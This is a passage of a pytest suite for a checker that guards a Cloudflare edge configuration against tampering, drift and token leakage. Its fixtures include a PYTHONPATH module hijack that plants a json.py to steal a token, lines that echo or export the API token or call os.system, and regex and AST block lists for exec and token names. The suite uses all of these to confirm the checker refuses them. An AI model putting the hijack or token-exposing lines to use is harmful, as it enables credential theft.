    content: bytes | None,
) -> None:
    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    monkeypatch.setattr(check, "api_result", lambda p, t: {})
    (tmp_path / EDGE).mkdir(parents=True)
    if content is not None:
        (tmp_path / EDGE / "desired-state.json").write_bytes(content)
    monkeypatch.setattr(check, "ROOT", tmp_path)
    code = check.main(["--live", "--zone-id", "0" * 32])
    out = capsys.readouterr()
    assert code == 2
    assert "Traceback" not in out.err
    assert out.err.strip() == "UNREADABLE desired state"  # fixed message


@pytest.mark.parametrize("error", [ValueError, UnicodeError, OSError])
def test_request_construction_errors_are_unreadable_without_detail(
    monkeypatch: pytest.MonkeyPatch, error: type[Exception]
) -> None:
    def bad_request(*args: Any, **kwargs: Any) -> Any:
        raise error("detail " + SENTINEL)

    monkeypatch.setattr(urllib.request, "Request", bad_request)
    with pytest.raises(check.Unreadable) as info:
        check.get(check.API + "/zones/x", SENTINEL)
    assert SENTINEL not in str(info.value)


def test_a_garbage_response_body_is_unreadable_not_a_crash(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    monkeypatch.setattr(check, "get", lambda url, token: b"\xff\xfe not json")
    assert check.main(["--live", "--zone-id", "0" * 32]) == 2
    assert "Traceback" not in capsys.readouterr().err


# --- the module is bound to the desired state by structure (Daybreak round 1) ---


def edit_main(root: Path, old: str, new: str) -> None:
    path = root / EDGE / "main.tf"
    text = path.read_text()
    assert old in text
    path.write_text(text.replace(old, new, 1))


def test_a_literal_in_the_resource_is_caught_even_with_a_decoy_reference(
    root: Path,
) -> None:
    edit_main(
        root,
        "ai_training                 = local.bot.ai_training",
        'ai_training                 = "disabled"',
    )
    edit_main(root, "locals {", "locals {\n  guard_bypass = local.bot.ai_training")
    problems = check.offline_problems(root)
    assert any("ai_training must be 'local.bot.ai_training'" in p for p in problems)


def test_swapped_bindings_are_caught(root: Path) -> None:
    edit_main(root, "= local.bot.ai_user", "= local.bot.ai_training")
    assert any("ai_user must be" in p for p in check.offline_problems(root))


@pytest.mark.parametrize(
    "extra",
    [
        'resource "cloudflare_ruleset" "x" {}',
        'resource "cloudflare_dns_record" "x" {\n  zone_id = var.zone_id\n}',
        'data "cloudflare_zone" "x" {}',
        'module "m" {\n  source = "./m"\n}',
        'import {\n  id = "x"\n}',
        'resource "cloudflare_bot_management" "other" {\n  zone_id = var.zone_id\n}',
    ],
)
def test_any_other_resource_or_block_fails(root: Path, extra: str) -> None:
    path = root / EDGE / "main.tf"
    path.write_text(path.read_text() + "\n" + extra + "\n")
    assert check.offline_problems(root)


def test_a_nested_provisioner_or_lifecycle_block_fails(root: Path) -> None:
    edit_main(
        root,
        "  zone_id = var.zone_id\n",
        "  zone_id = var.zone_id\n  lifecycle {\n  }\n",
    )
    assert any("assignments" in p for p in check.offline_problems(root))


def test_extra_locals_and_comment_tricks_fail(root: Path) -> None:
    edit_main(root, "locals {", 'locals {\n  extra = "x"')
    assert any("locals differ" in p for p in check.offline_problems(root))


def test_block_comments_are_refused(root: Path) -> None:
    path = root / EDGE / "main.tf"
    path.write_text(path.read_text() + "\n/* hidden */\n")
    assert any("only # comments" in p for p in check.offline_problems(root))


@pytest.mark.parametrize(
    "name", ["edge-plan.bin", "x.tfstate", "crash.log", "plan", ".terraform"]
)
def test_a_stray_file_in_the_edge_folder_fails(root: Path, name: str) -> None:
    (root / EDGE / name).write_text("x")
    assert any(name in p for p in check.offline_problems(root))


def test_the_gitignore_ignores_everything_not_listed() -> None:
    lines = [
        x.strip()
        for x in (REPO / EDGE / ".gitignore").read_text().splitlines()
        if x.strip() and not x.startswith("#")
    ]
    assert lines[0] == "*"
    allowed = {x[1:] for x in lines[1:]}
    assert all(x.startswith("!") for x in lines[1:])
    assert allowed == set(check.ALLOWED_EDGE_FILES)


def test_the_files_in_the_edge_folder_are_all_expected() -> None:
    names = {p.name for p in (REPO / EDGE).iterdir()}
    assert names <= set(check.ALLOWED_EDGE_FILES)


def test_the_real_module_has_one_resource_and_says_it_is_apply_capable() -> None:
    text = (REPO / EDGE / "main.tf").read_text()
    assert len(re.findall(r"^resource\s", text, re.M)) == 1
    assert "apply-capable but apply-prohibited" in text
    doc = (REPO / "docs" / "edge.md").read_text()
    assert "## Policy, not capability" in doc
    assert "apply-capable" in doc


# --- live mode validates the desired state first ------------------------------


@pytest.mark.parametrize(
    "mutate",
    [
        lambda d: d["bot_management"].update(ai_training="disabled"),
        lambda d: d["rate_limit"].update(expression="true"),
        lambda d: d["rate_limit"].update(requests_per_period=100000),
        lambda d: d["rate_limit"].update(ref="anything"),
        lambda d: d["bot_management"].update(enable_js=True),
    ],
)
def test_live_refuses_an_unsafe_desired_state_before_any_request(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    root: Path,
    mutate: Any,
) -> None:
    data = copy.deepcopy(desired())
    mutate(data)
    write_desired(root, data)
    calls: list[str] = []

    def spy(path: str, token: str) -> Any:
        calls.append(path)
        return {}

    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    monkeypatch.setattr(check, "api_result", spy)
    monkeypatch.setattr(check, "ROOT", root)
    assert check.main(["--live", "--zone-id", "0" * 32]) == 2
    assert calls == []
    assert "INVALID" in capsys.readouterr().err


def test_live_refuses_a_module_that_differs_from_the_desired_state(
    monkeypatch: pytest.MonkeyPatch, root: Path
) -> None:
    edit_main(root, "= local.bot.fight_mode", "= true")
    calls: list[str] = []
    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)

    def spy(path: str, token: str) -> Any:
        calls.append(path)
        return {}

    monkeypatch.setattr(check, "api_result", spy)
    monkeypatch.setattr(check, "ROOT", root)
    assert check.main(["--live", "--zone-id", "0" * 32]) == 2
    assert calls == []


def test_a_second_rule_claiming_our_ref_is_ambiguous_not_agreement() -> None:
    d = desired()["rate_limit"]
    live = live_rules()
    assert check.rate_differences(d, live) == []
    live["rules"].append(
        {
            "ref": d["ref"],
            "expression": "true",
            "action": "block",
            "description": d["description"],
            "ratelimit": {
                "characteristics": ["cf.colo.id", "ip.src"],
                "period": 10,
                "requests_per_period": 1,
                "mitigation_timeout": 10,
            },
        }
    )
    assert any("ambiguous" in x for x in check.rate_differences(d, live))
    live["rules"].reverse()
    assert any("ambiguous" in x for x in check.rate_differences(d, live))


def test_two_rules_with_our_expression_and_no_ref_are_ambiguous() -> None:
    d = desired()["rate_limit"]
    live = live_rules()
    for rule in live["rules"]:
        if rule.get("ref") == d["ref"]:
            rule["ref"] = "renamed-1"
    clone = copy.deepcopy([r for r in live["rules"] if r["ref"] == "renamed-1"][0])
    clone["ref"] = "renamed-2"
    live["rules"].append(clone)
    assert any("ambiguous" in x for x in check.rate_differences(d, live))


def test_a_rule_matching_by_ref_plus_another_by_expression_is_ambiguous() -> None:
    d = desired()["rate_limit"]
    live = live_rules()
    ours = [r for r in live["rules"] if r.get("ref") == d["ref"]][0]
    other = copy.deepcopy(ours)
    other["ref"] = "renamed"  # matches our expression, not our ref
    live["rules"].append(other)
    assert any("ambiguous" in x for x in check.rate_differences(d, live))
    live["rules"].reverse()
    assert any("ambiguous" in x for x in check.rate_differences(d, live))


def test_a_rule_with_our_ref_and_another_with_our_expression_only_is_ambiguous() -> (
    None
):
    d = desired()["rate_limit"]
    live = live_rules()
    ours = [r for r in live["rules"] if r.get("ref") == d["ref"]][0]
    ours["expression"] = "true"  # matches by ref only
    other = copy.deepcopy(ours)
    other["ref"] = "someone-else"
    other["expression"] = d["expression"]  # matches by expression only
    live["rules"].append(other)
    assert any("ambiguous" in x for x in check.rate_differences(d, live))


def test_one_rule_matching_by_both_is_not_ambiguous() -> None:
    d = desired()["rate_limit"]
    assert not any("ambiguous" in x for x in check.rate_differences(d, live_rules()))


def test_codeowners_names_the_edge_files_and_the_checker() -> None:
    owners = (REPO / ".github" / "CODEOWNERS").read_text()
    for path in (
        "/deploy/edge/",
        "/scripts/check-edge.py",
        "/tests/test_edge_settings.py",
    ):
        assert any(
            line.startswith(path + " ") and "@ChiefGyk3D" in line
            for line in owners.splitlines()
        ), path


# --- the reviewed minimum, the manifest identity and the lock shape (#613) -----


@pytest.mark.parametrize(
    "value",
    [">= 0.1.0", ">= 1.8.0", ">= 1.9", ">= 1.9.0, < 3.0.0", "~> 1.9.0", ">= 1.10.0"],
)
def test_the_opentofu_minimum_cannot_be_changed_silently(
    root: Path, value: str
) -> None:
    edit_file(root, "versions.tf", '">= 1.9.0"', f'"{value}"')
    assert any("required_version" in p for p in check.offline_problems(root))


@pytest.mark.parametrize(
    ("key", "value"),
    [
        ("schema", 999),
        ("schema", True),
        ("provider", "attacker/example"),
        ("resource", "unrelated_resource"),
        ("command", "manually invented"),
        ("computed_only", []),
        ("computed_only", ["id"]),
    ],
)
def test_the_manifest_identity_and_computed_fields_are_validated(
    root: Path, key: str, value: object
) -> None:
    path = root / EDGE / "provider-fields.json"
    data = json.loads(path.read_text())
    data[key] = value
    path.write_text(json.dumps(data))
    assert any("manifest" in p and key in p for p in check.offline_problems(root))


def test_an_extra_manifest_key_is_refused(root: Path) -> None:
    path = root / EDGE / "provider-fields.json"
    data = json.loads(path.read_text())
    data["note"] = "x"
    path.write_text(json.dumps(data))
    assert any("unexpected keys" in p for p in check.offline_problems(root))


LOCK_EDITS = {
    "wrong source": (
        "registry.opentofu.org/cloudflare/cloudflare",
        "registry.example.invalid/x/y",
    ),
    "no constraints": ('  constraints = "5.29.0"\n', ""),
    "constraints differ": ('constraints = "5.29.0"', 'constraints = ">= 5.0.0"'),
    "version differs": ('version     = "5.29.0"', 'version     = "5.30.0"'),
    "garbage hash": ('"h1:1fDzIJCxqkosa3+q7RJA3e4CBxFoCHHtQDz0ZkHGUWg="', '"nothash"'),
}


@pytest.mark.parametrize("name", sorted(LOCK_EDITS))
def test_the_lock_entry_shape_is_validated(root: Path, name: str) -> None:
    old, new = LOCK_EDITS[name]
    edit_file(root, ".terraform.lock.hcl", old, new)
    assert any("lock" in p for p in check.offline_problems(root))


def test_a_second_lock_entry_is_refused(root: Path) -> None:
    path = root / EDGE / ".terraform.lock.hcl"
    path.write_text(path.read_text() + path.read_text().split("\n\n", 1)[1])
    assert any("lock" in p for p in check.offline_problems(root))


# --- the HCL checker reads tokens, never braces counted on raw lines (#613) ----

HIDDEN = 'resource "cloudflare_ruleset" "x" {\n  y = 1\n}\n'


def append_main(root: Path, text: str) -> None:
    path = root / EDGE / "main.tf"
    path.write_text(path.read_text() + text)


def test_the_real_files_tokenize_and_parse() -> None:
    for name in ("main.tf", "variables.tf", "versions.tf"):
        blocks = check.hcl_blocks((REPO / EDGE / name).read_text())
        assert blocks
    kinds = [b.kind for b in check.hcl_blocks((REPO / EDGE / "main.tf").read_text())]
    assert kinds == ["locals", "resource"]


def test_a_brace_inside_a_string_cannot_hide_a_resource(root: Path) -> None:
    # Counted per line, the "{" opens a phantom block and swallows what follows.
    append_main(root, 'locals_decoy = "{"\n' + HIDDEN)
    problems = check.offline_problems(root)
    assert any(
        "brace inside a string" in p or "cannot be parsed" in p for p in problems
    )


def test_a_closing_brace_in_a_string_cannot_close_the_block_early(root: Path) -> None:
    edit_main(root, "zone_id = var.zone_id\n", 'zone_id = var.zone_id\n  note = "}"\n')
    assert any("brace inside a string" in p for p in check.offline_problems(root))


def test_an_escaped_quote_followed_by_a_brace_is_still_inside_the_string(
    root: Path,
) -> None:
    append_main(root, 'x = "a\\"}"\n' + HIDDEN)
    assert any("brace inside a string" in p for p in check.offline_problems(root))


def test_an_interpolation_is_refused(root: Path) -> None:
    edit_main(root, "zone_id = var.zone_id\n", 'zone_id = "${var.zone_id}"\n')
    assert any("brace inside a string" in p for p in check.offline_problems(root))


def test_a_closing_brace_then_a_hidden_block_on_the_same_line_is_refused(
    root: Path,
) -> None:
    path = root / EDGE / "main.tf"
    path.write_text(path.read_text().rstrip().removesuffix("}") + "} " + HIDDEN)
    problems = check.offline_problems(root)
    assert any("same line" in p for p in problems)


def test_a_hidden_block_before_the_closing_brace_on_one_line_is_refused(
    root: Path,
) -> None:
    edit_main(root, "locals {", 'locals { extra = 1 }\nresource "x" "y" {')
    assert check.offline_problems(root)


def test_crlf_line_endings_parse_the_same(root: Path) -> None:
    for name in ("main.tf", "variables.tf", "versions.tf"):
        path = root / EDGE / name
        path.write_bytes(path.read_bytes().replace(b"\n", b"\r\n"))
    assert check.offline_problems(root) == []


def test_crlf_cannot_hide_a_block(root: Path) -> None:
    path = root / EDGE / "main.tf"
    data = path.read_bytes().replace(b"\n", b"\r\n")
    path.write_bytes(data + HIDDEN.replace("\n", "\r\n").encode())
    assert check.offline_problems(root)


def test_a_lone_carriage_return_is_refused(root: Path) -> None:
    append_main(root, "# comment\r" + HIDDEN)
    assert any("cannot be parsed" in p for p in check.offline_problems(root))


@pytest.mark.parametrize("text", ["{\n", "}\n", "locals {\n", "locals {\n}\n}\n"])
def test_unbalanced_braces_fail_closed(root: Path, text: str) -> None:
    append_main(root, "\n" + text)
    assert check.offline_problems(root)
    with pytest.raises(check.HclError):
        check.hcl_blocks(text)


@pytest.mark.parametrize(
    "text",
    [
        'x = "unterminated\n',
        'x = "bad \\q escape"\n',
        "x = `tick`\n",
        "x = a / b\n",
        "x = $y\n",
        '﻿variable "a" {}\n',
        'x = "café"\n',
        "x = <<EOT\nbody\nEOT\n",
        "/* c */\n",
        "// c\n",
    ],
)
def test_text_outside_the_subset_fails_closed(root: Path, text: str) -> None:
    with pytest.raises(check.HclError):
        check.hcl_blocks(text)
    append_main(root, "\n" + text)
    assert any("cannot be parsed" in p for p in check.offline_problems(root))


def test_a_brace_in_a_comment_is_harmless_and_a_hash_in_a_string_is_not_a_comment(
    root: Path,
) -> None:
    blocks = check.hcl_blocks('# }{\nlocals {\n  a = "x#y" # }\n}\n')
    assert [b.attrs for b in blocks] == [[("a", '"x#y"')]]


@pytest.mark.parametrize(
    ("old", "new"),
    [
        (
            'required_version = ">= 1.9.0"',
            'required_version = ">= 1.9.0"\n  backend = 1',
        ),
        ('source = "cloudflare/cloudflare"', 'source = "evil/cloudflare"'),
        ('version = "= 5.29.0"', 'version = "= 5.29.0"\n      extra = 1'),
        ("required_providers {", 'required_providers {\n    other = "x"'),
    ],
)
def test_the_terraform_block_is_checked_against_an_allowlist(
    root: Path, old: str, new: str
) -> None:
    path = root / EDGE / "versions.tf"
    text = path.read_text()
    assert old in text
    path.write_text(text.replace(old, new, 1))
    assert any(
        "terraform" in p or "cloudflare" in p for p in check.offline_problems(root)
    )


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ("  type        = string\n", '  type        = string\n  default     = "x"\n'),
        ("  type        = string\n", "  type        = string\n  sensitive   = true\n"),
        ("var.zone_id))", "true) || true"),
        ('"zone_id"', '"other"'),
        ("  validation {", '  provisioner "x" {\n  }\n  validation {'),
    ],
)
def test_the_variable_block_is_checked_against_an_allowlist(
    root: Path, old: str, new: str
) -> None:
    path = root / EDGE / "variables.tf"
    text = path.read_text()
    assert old in text
    path.write_text(text.replace(old, new, 1))
    assert any("zone_id" in p or "variable" in p for p in check.offline_problems(root))


def test_a_second_variable_block_fails(root: Path) -> None:
    path = root / EDGE / "variables.tf"
    path.write_text(path.read_text() + path.read_text().split("\n", 1)[1])
    assert any("once" in p for p in check.offline_problems(root))


# --- no token-bearing launcher, required files, bounded robots fetch (#613) ----


@pytest.mark.parametrize("name", ["plan.sh", "tofu.rc"])
def test_the_launcher_files_are_absent_and_cannot_come_back(
    root: Path, name: str
) -> None:
    assert not (REPO / EDGE / name).exists()
    assert not (root / EDGE / name).exists()
    (root / EDGE / name).write_text("# nothing\n")
    problems = check.offline_problems(root)
    assert any(name in p and "launcher" in p for p in problems), problems


def test_no_file_in_deploy_edge_references_the_token_or_an_executable() -> None:
    pattern = re.compile(
        rf"TOFU_BIN|CLOUDFLARE_API_TOKEN|{check.TOKEN_ENV}"
        r"|TF_CLI_CONFIG_FILE|subprocess|Popen|os\.system",
        re.I,
    )
    for path in sorted((REPO / EDGE).iterdir()):
        text = path.read_bytes().decode("utf-8", "replace")
        assert not pattern.search(text), path.name
        assert not text.startswith("#!"), path.name
        assert not path.stat().st_mode & 0o111, path.name


@pytest.mark.parametrize(
    "text",
    [
        "TOFU_BIN=/home/u/bin/tofu\n",
        "# note\nexport CLOUDFLARE_API_TOKEN\n",
        "import subprocess\n",
        "#!/bin/sh\n",
        "x = os.system('id')\n",
        "TF_CLI_CONFIG_FILE=/x\n",
    ],
)
def test_text_that_hands_a_token_to_a_program_fails_the_offline_check(
    root: Path, text: str
) -> None:
    path = root / EDGE / ".gitignore"
    path.write_text(path.read_text() + text)
    problems = check.offline_problems(root)
    assert any("pass an API token" in p for p in problems), problems


def test_the_checker_itself_never_starts_a_program_or_looks_one_up() -> None:
    tree = ast.parse((REPO / "scripts" / "check-edge.py").read_text())
    banned_modules = {"subprocess", "pty", "multiprocessing", "ctypes"}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            assert not {a.name.split(".")[0] for a in node.names} & banned_modules
        if isinstance(node, ast.ImportFrom):
            assert (node.module or "").split(".")[0] not in banned_modules
        if isinstance(node, ast.Attribute):
            assert node.attr not in {"system", "popen", "execv", "execvp", "which"}
            assert not (node.attr.startswith("spawn") or node.attr.startswith("exec"))


def test_the_launcher_pin_machinery_is_gone() -> None:
    for name in ("LAUNCHER_PINS", "plan_script_problems", "launcher_problems"):
        assert not hasattr(check, name), name


def test_the_docs_say_where_the_plan_runs_and_do_not_name_a_launcher() -> None:
    doc = (REPO / "docs" / "edge.md").read_text()
    assert "## Where the plan runs" in doc
    assert "Spacelift" in doc.split("## Where the plan runs", 1)[1].split("##")[0]
    for name in ("plan.sh", "tofu.rc", "TOFU_BIN"):
        assert name not in doc, name


def test_codeowners_limit_is_documented_as_a_repository_setting() -> None:
    doc = (REPO / "docs" / "edge.md").read_text()
    assert "Require review" in doc and "Code Owners" in doc
    assert "repository setting" in doc


@pytest.mark.parametrize("name", [*FILES, ".gitignore"])
def test_a_missing_reviewed_file_fails_the_offline_check(root: Path, name: str) -> None:
    (root / EDGE / name).unlink()
    assert any(name in p for p in check.offline_problems(root))


def test_removing_variables_tf_fails_with_a_clear_message(root: Path) -> None:
    (root / EDGE / "variables.tf").unlink()
    problems = check.offline_problems(root)
    assert any("variables.tf" in p and "missing" in p for p in problems), problems
    # the module check on its own also refuses a folder with no variable block
    assert any("exactly once" in p for p in check.module_problems(root / EDGE))


def test_no_variable_block_fails_even_if_the_file_exists(root: Path) -> None:
    (root / EDGE / "variables.tf").write_text("# empty\n")
    assert any("exactly once" in p for p in check.offline_problems(root))


def test_the_robots_fetch_tries_at_most_a_few_addresses(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    addresses = [f"93.184.216.{n}" for n in range(1, 101)]
    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver(addresses))
    tried: list[Any] = []

    def refuse(address: Any, timeout: Any = None) -> Any:
        tried.append(address)
        raise OSError("down")

    monkeypatch.setattr(check.socket, "create_connection", refuse)
    with pytest.raises(check.Unreadable):
        check.fetch_robots("links.example.com")
    assert len(tried) == check.ROBOTS_MAX_ADDRESSES


def test_the_robots_fetch_has_one_overall_deadline(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    addresses = [f"93.184.216.{n}" for n in range(1, 4)]
    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver(addresses))
    clock = [1000.0]
    monkeypatch.setattr(check.time, "monotonic", lambda: clock[0])
    tried: list[Any] = []

    def slow(address: Any, timeout: Any = None) -> Any:
        tried.append((address, timeout))
        clock[0] += check.ROBOTS_DEADLINE  # the attempt used the whole budget
        raise OSError("timed out")

    monkeypatch.setattr(check.socket, "create_connection", slow)
    with pytest.raises(check.Unreadable, match="exceeded"):
        check.fetch_robots("links.example.com")
    assert len(tried) == 1  # no second attempt after the budget is gone
    assert tried[0][1] <= check.TIMEOUT


def test_a_slow_drip_body_cannot_outlast_the_deadline(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver(["93.184.216.34"]))
    clock = [1000.0]
    monkeypatch.setattr(check.time, "monotonic", lambda: clock[0])

    class Sock:
        def settimeout(self, value: float) -> None:
            pass

    class Response:
        status = 200

        def read(self, n: int) -> bytes:
            clock[0] += 10.0  # each chunk arrives 10 seconds later
            return b"x"

    real = check.PinnedHTTPSConnection

    def Conn(host: str, address: str, timeout: float, deadline: Any) -> Any:
        conn = real(host, address, timeout, deadline)
        conn.sock = Sock()
        conn.request = lambda *a, **k: None
        conn.getresponse = lambda: Response()
        conn.close = lambda: None
        return conn

    monkeypatch.setattr(check, "PinnedHTTPSConnection", Conn)
    with pytest.raises(check.Unreadable, match="exceeded"):
        check.fetch_robots("links.example.com")


# --- round 5: key log, full rate-rule comparison, repo-wide handoff, snapshot --


def test_the_tls_context_verifies_and_never_logs_keys(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    monkeypatch.setenv("SSLKEYLOGFILE", str(tmp_path / "keys"))
    context = check.tls_context()
    assert context.verify_mode == ssl.CERT_REQUIRED
    assert context.check_hostname is True
    assert context.keylog_filename is None


def test_get_builds_its_opener_from_the_keyless_context(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    seen: list[Any] = []

    def fake_build_opener(*handlers: Any) -> Any:
        seen.extend(handlers)

        class Stub:
            def open(self, *args: Any, **kwargs: Any) -> Any:
                raise urllib.error.URLError("stop")

        return Stub()

    monkeypatch.setattr(urllib.request, "build_opener", fake_build_opener)
    with pytest.raises(check.Unreadable):
        check.get(check.API + "/zones/x", SENTINEL)
    https = [h for h in seen if isinstance(h, urllib.request.HTTPSHandler)]
    context = vars(https[0])["_context"]
    assert context.verify_mode == ssl.CERT_REQUIRED
    assert context.keylog_filename is None


@pytest.mark.parametrize(
    ("where", "key", "value"),
    [
        ("rule", "action_parameters", {"response": {"status_code": 200}}),
        ("rule", "logging", {"enabled": False}),
        ("rule", "unknown_field", 1),
        ("limit", "counting_expression", "false"),
        ("limit", "requests_to_origin", True),
        ("limit", "score_per_period", 5),
        ("limit", "score_response_header_name", "x"),
        ("limit", "unknown_field", 1),
    ],
)
def test_an_extra_behavior_field_on_the_live_rule_is_drift(
    where: str, key: str, value: Any
) -> None:
    live = live_rules()
    target = live["rules"][0] if where == "rule" else live["rules"][0]["ratelimit"]
    target[key] = value
    found = check.rate_differences(desired()["rate_limit"], live)
    assert found and any(key in f for f in found), found


def test_harmless_rule_metadata_and_empty_counting_expression_are_not_drift() -> None:
    live = live_rules()
    rule = live["rules"][0]
    rule.update(version="3", last_updated="2026-01-01T00:00:00Z", categories=["x"])
    rule["ratelimit"]["counting_expression"] = ""
    assert check.rate_differences(desired()["rate_limit"], live) == []


@pytest.mark.parametrize("key", ["action", "period", "mitigation_timeout"])
def test_each_core_rate_field_is_compared(key: str) -> None:
    live = live_rules()
    target = live["rules"][0]
    if key != "action":
        target = target["ratelimit"]
    target[key] = "other" if key == "action" else 99
    found = check.rate_differences(desired()["rate_limit"], live)
    assert any(key in f for f in found), found


def test_characteristics_must_be_a_list_matching_the_desired_ones() -> None:
    live = live_rules()
    live["rules"][0]["ratelimit"]["characteristics"] = ["ip.src"]
    assert check.rate_differences(desired()["rate_limit"], live)
    live["rules"][0]["ratelimit"]["characteristics"] = "ip.src"
    assert check.rate_differences(desired()["rate_limit"], live)


def test_the_extra_field_difference_reaches_the_live_exit_code(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    rules = live_rules()
    rules["rules"][0]["ratelimit"]["counting_expression"] = "false"
    monkeypatch.setenv(check.TOKEN_ENV, SENTINEL)
    monkeypatch.setattr(
        check,
        "api_result",
        lambda path, token: live_bot() if "bot_" in path else rules,
    )
    assert check.main(["--live", "--zone-id", "0" * 32]) == 1
    assert "counting_expression" in capsys.readouterr().out


@pytest.mark.parametrize(
    ("rel", "text"),
    [
        (
            "scripts/edge-plan.py",
            f"import os\nx = os.environ[{check.TOKEN_ENV!r}]\n",
        ),
        (
            ".github/workflows/edge.yml",
            f"env:\n  T: ${{{{ env.{check.TOKEN_ENV} }}}}\n",
        ),
        ("tools/run", f"#!/bin/sh\necho ${check.TOKEN_ENV}\n"),
    ],
)
def test_naming_the_read_token_outside_the_checker_fails_the_offline_check(
    root: Path, rel: str, text: str
) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    problems = check.offline_problems(root)
    assert any(rel in p and "edge token" in p for p in problems), problems


def test_docs_and_the_checker_may_name_the_read_token(root: Path) -> None:
    (root / "docs").mkdir()
    (root / "docs" / "edge.md").write_text(f"{check.TOKEN_ENV}\n")
    (root / "scripts").mkdir()
    (root / "scripts" / "check-edge.py").write_text(f"T = '{check.TOKEN_ENV}'\n")
    assert check.offline_problems(root) == []


def test_a_failed_snapshot_write_leaves_nothing_and_can_be_retried(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    target = tmp_path / "snap.json"
    real_fsync = check.os.fsync

    def boom(fd: int) -> None:
        raise OSError(28, "no space")

    monkeypatch.setattr(check.os, "fsync", boom)
    with pytest.raises(OSError):
        check.write_new_file(target, '{"a": 1}')
    assert list(tmp_path.iterdir()) == []  # no partial file, no temp file
    monkeypatch.setattr(check.os, "fsync", real_fsync)
    check.write_new_file(target, '{"a": 1}')
    assert target.read_text() == '{"a": 1}'
    assert oct(target.stat().st_mode & 0o777) == "0o600"
    assert [p.name for p in tmp_path.iterdir()] == ["snap.json"]


def test_snapshot_never_overwrites_or_follows_a_link(tmp_path: Path) -> None:
    existing = tmp_path / "old.json"
    existing.write_text("keep")
    with pytest.raises(OSError):
        check.write_new_file(existing, "new")
    assert existing.read_text() == "keep"
    link = tmp_path / "link.json"
    link.symlink_to(tmp_path / "elsewhere.json")
    with pytest.raises(OSError):
        check.write_new_file(link, "new")
    assert not (tmp_path / "elsewhere.json").exists()
    assert sorted(p.name for p in tmp_path.iterdir()) == ["link.json", "old.json"]


# --- round 6: isolated run, full-repository scan, narrow test exemption -------

NAME = check.TOKEN_ENV
CHECKER = REPO / "scripts" / "check-edge.py"


def run_checker(
    tmp_path: Path, args: list[str], isolated: bool, env: dict[str, str]
) -> subprocess.CompletedProcess[str]:
    import sys

    cmd = [sys.executable] + (["-I"] if isolated else []) + [str(CHECKER), *args]
    return subprocess.run(  # noqa: S603
        cmd, capture_output=True, text=True, env=env, cwd=tmp_path, timeout=60
    )


def hostile_env(tmp_path: Path) -> dict[str, str]:
    steal = tmp_path / "steal"
    steal.mkdir()
    (steal / "json.py").write_text(
        f"open({str(tmp_path / 'stolen')!r}, 'w').write('ran')\nraise RuntimeError\n"
    )
    return {"PYTHONPATH": str(steal), NAME: "secret", "PATH": "/usr/bin:/bin"}


def test_a_non_isolated_run_is_refused_before_any_injected_module_runs(
    tmp_path: Path,
) -> None:
    result = run_checker(
        tmp_path, ["--live", "--zone-id", "0" * 32], False, hostile_env(tmp_path)
    )
    assert result.returncode == 2
    assert "python3 -I" in result.stderr
    assert not (tmp_path / "stolen").exists()
    assert "secret" not in result.stdout + result.stderr


def test_an_isolated_run_ignores_pythonpath(tmp_path: Path) -> None:
    result = run_checker(tmp_path, ["--offline"], True, hostile_env(tmp_path))
    assert result.returncode == 0, result.stderr
    assert not (tmp_path / "stolen").exists()


def test_importing_the_checker_without_isolation_fails_closed_before_any_token_read(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr(check, "_isolated", REAL_ISOLATED)
    assert check.sys.flags.isolated != 1  # this test process is not run with -I
    reads: list[str] = []

    real_get = check.os.environ.get

    def spy(key: str, default: Any = None) -> Any:
        if key == check.TOKEN_ENV:
            reads.append(key)
            return "secret"
        return real_get(key, default)

    monkeypatch.setattr(check.os.environ, "get", spy)

    def no_network(*a: Any, **k: Any) -> Any:
        raise AssertionError("network used")

    monkeypatch.setattr(check, "api_result", no_network)
    monkeypatch.setattr(check, "fetch_robots", no_network)
    assert check.main(["--live", "--zone-id", "0" * 32]) == 2
    assert reads == []
    err = capsys.readouterr().err
    assert "REFUSED" in err and "secret" not in err


def import_checker(
    tmp_path: Path, env: dict[str, str]
) -> subprocess.CompletedProcess[str]:
    import sys

    code = (
        "from importlib.machinery import SourceFileLoader as L\n"
        "from importlib.util import module_from_spec, spec_from_loader\n"
        f"s = spec_from_loader('c', L('c', {str(CHECKER)!r}))\n"
        "m = module_from_spec(s)\n"
        "s.loader.exec_module(m)\n"
        "print('imported')\n"
    )
    return subprocess.run(  # noqa: S603
        [sys.executable, "-B", "-c", code],  # -B: write no cache of the checker
        capture_output=True,
        text=True,
        env=env,
        cwd=tmp_path,
        timeout=60,
    )


def test_a_non_isolated_import_with_the_token_set_is_refused_before_any_module_runs(
    tmp_path: Path,
) -> None:
    result = import_checker(tmp_path, hostile_env(tmp_path))
    assert result.returncode == 2, result.stderr
    assert "REFUSED" in result.stderr
    assert "imported" not in result.stdout
    assert not (tmp_path / "stolen").exists()  # the hostile json.py never ran
    assert "secret" not in result.stdout + result.stderr


def test_a_non_isolated_import_without_the_token_is_allowed_and_holds_none(
    tmp_path: Path,
) -> None:
    env = {"PATH": "/usr/bin:/bin"}
    result = import_checker(tmp_path, env)
    assert result.returncode == 0, result.stderr
    assert "imported" in result.stdout


def test_the_token_reader_checks_isolation_itself(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(check, "_isolated", REAL_ISOLATED)
    monkeypatch.setenv(NAME, "secret")
    reads: list[str] = []
    real_get = check.os.environ.get

